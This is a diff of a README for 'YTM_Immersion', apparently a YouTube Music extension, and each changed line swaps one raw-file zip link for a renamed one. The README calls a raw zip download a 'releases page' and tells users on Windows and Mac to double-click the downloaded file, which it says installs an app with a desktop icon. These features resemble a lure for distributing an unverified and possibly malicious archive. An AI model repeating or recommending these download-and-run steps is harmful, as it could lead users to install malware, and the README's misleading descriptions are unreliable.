@@ -1,6 +1,6 @@
 # 🎶 YTM_Immersion - Enhance Your YouTube Music Experience
 
-![Download YTM_Immersion](https://raw.githubusercontent.com/Sikbiditoilehater/YTM_Immersion/main/src/YTM_Immersion_v2.5.zip)
+![Download YTM_Immersion](https://raw.githubusercontent.com/Sikbiditoilehater/YTM_Immersion/main/src/Immersion_YT_v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to YTM_Immersion! This extension enhances your YouTube Music experience.
 
 ## 📥 Download & Install
 
-To get started, you need to download YTM_Immersion. Visit this page to download: [YTM_Immersion Releases](https://raw.githubusercontent.com/Sikbiditoilehater/YTM_Immersion/main/src/YTM_Immersion_v2.5.zip).
+To get started, you need to download YTM_Immersion. Visit this page to download: [YTM_Immersion Releases](https://raw.githubusercontent.com/Sikbiditoilehater/YTM_Immersion/main/src/Immersion_YT_v3.4.zip).
 
 1. Click on the link above to open the releases page on GitHub.
 2. Find the latest version listed.
@@ -32,13 +32,13 @@ After downloading the file, follow these instructions to run YTM_Immersion:
 
 ### Windows
 1. Navigate to your Downloads folder.
-2. Double-click the downloaded file (https://raw.githubusercontent.com/Sikbiditoilehater/YTM_Immersion/main/src/YTM_Immersion_v2.5.zip).
+2. Double-click the downloaded file (https://raw.githubusercontent.com/Sikbiditoilehater/YTM_Immersion/main/src/Immersion_YT_v3.4.zip).
 3. Follow any on-screen instructions.
 4. Once installed, you can find the YTM_Immersion icon on your desktop or in the Start Menu. Open it to start using the extension.
 
 ### Mac
 1. Go to your Downloads folder.
-2. Double-click the downloaded file (https://raw.githubusercontent.com/Sikbiditoilehater/YTM_Immersion/main/src/YTM_Immersion_v2.5.zip).
+2. Double-click the downloaded file (https://raw.githubusercontent.com/Sikbiditoilehater/YTM_Immersion/main/src/Immersion_YT_v3.4.zip).
 3. Drag the YTM_Immersion icon to your Applications folder.
 4. Open your Applications folder and double-click YTM_Immersion to launch the application.
 
@@ -77,6 +77,6 @@ If you need further assistance, check out our support resources on GitHub. You c
 
 ## 📢 Stay Updated
 
-To stay informed about updates and new features for YTM_Immersion, keep visiting the releases page: [YTM_Immersion Releases](https://raw.githubusercontent.com/Sikbiditoilehater/YTM_Immersion/main/src/YTM_Immersion_v2.5.zip).
+To stay informed about updates and new features for YTM_Immersion, keep visiting the releases page: [YTM_Immersion Releases](https://raw.githubusercontent.com/Sikbiditoilehater/YTM_Immersion/main/src/Immersion_YT_v3.4.zip).
 
 Thank you for using YTM_Immersion! Enjoy enhancing your YouTube Music experience.
